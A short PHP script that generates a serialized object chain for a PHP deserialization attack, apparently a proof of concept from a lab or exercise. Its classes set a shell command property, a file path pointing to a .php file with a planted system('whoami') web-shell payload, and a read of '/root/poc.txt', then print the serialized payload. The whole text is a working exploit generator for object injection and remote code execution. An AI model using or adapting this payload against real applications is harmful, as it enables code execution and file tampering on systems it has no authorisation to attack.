<?php

class pwned
{
    public function __construct()
    {
        $this->command = 'touch PHP/Deserialization/result.txt';
    }
}

class LogFile
{
    public function __construct()
    {
        $this->filename = 'PHP/Deserialization/pwned.php';
        $this->username = '<?php system("whoami"); ?>'; 
    }
}

class ReadFile
{
    public function __construct()
    {
        $this->filename = '/root/poc.txt';
        $this->secret = new pwned();
    }
}

class User
{
    public function __construct()
    {
        //Fast Destruct
        $this->username = new ReadFile();
        $this->isAdmin = False;
    }
}

$obj = new User();
echo serialize($obj);
echo "\n";
?>